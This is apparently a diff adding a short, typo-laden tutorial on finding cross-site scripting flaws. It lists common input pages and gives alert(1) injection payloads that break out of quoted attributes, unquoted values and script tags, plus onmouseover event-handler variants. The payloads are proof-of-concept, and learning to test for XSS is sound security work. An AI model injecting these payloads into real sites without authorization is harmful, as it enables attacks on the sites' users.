@@ -1,0 +1,61 @@
+#How ot find XSS vulnerability.
+1. Find a Input Parameter , Give any input There. If your input
+reflect or stored any where there may be XSS
+2. Try to execute any Javascript code there, if you succeed to
+execute any javascript there then there is a xss
+3. Exploitation of XSS
+
+#Steps and comman places where XSS found
+Steps:
+1. Find some common page such as – Contact Us | Search bar |
+Comment Box | Forums |Signup | Login Page | etc
+2. Find Input Parameters
+3. Give any Input there, if your Input reflect back to you
+4. Try to Inject any javascript there
+
+Important thing to remmber:
+"Browser executing HTML we know that and javascript can work with HTML."
+
+"Always check source code of page before putting any payload in any input field."
+
+"If we are facing situation like this [<a href="params.php?p=valid&pp=Hello">]' always check the ending of the function and start your payload with ending qutation in this situation our function is ending with double quote tag so our payload is start with double quote tag like this.. "><script>alert(1)</script>
+
+"We know that JS can work with HTML. If we have function like this:
+<input type="text" name="name" value=Hannan></input>
+
+<input type="text" name="name" value=<script>alert(1)</script>></input>
+
+<input type="text" name="name" value=>Hannan></input>
+
+payload = ><script>alert(1)</script> "
+
+"If our fucntion is closing with double quote like this:
+
+<input type="text" name="name" value="Hannan"></input>
+
+payload = "><script>alert(1)</script> "
+
+"If our function is closing wuth single quote liek this:
+
+<input type="text" name="name" value='Hannan'></input>
+
+payload = '><script>alert(1)</script>
+
+"If our fucntion is in script tag like this:
+
+<center><script>var search_str="Hannan";</script>
+
+Then, we use this payload: payload : </script><script>alert(1)</script> we can also apply this '; before payload."
+
+"Sometimes keyboard input will become a string responce you can try to give input through mouse like this:
+
+<input type="text" name="name" value='Hannan'></input>
+
+onmouseover=alert(1);
+
+'onmouseover='alert(1);
+
+If our input correctly placed outside of any HTML tag then JS will
+execute there:
+
+"onmouseover="alert(1); "
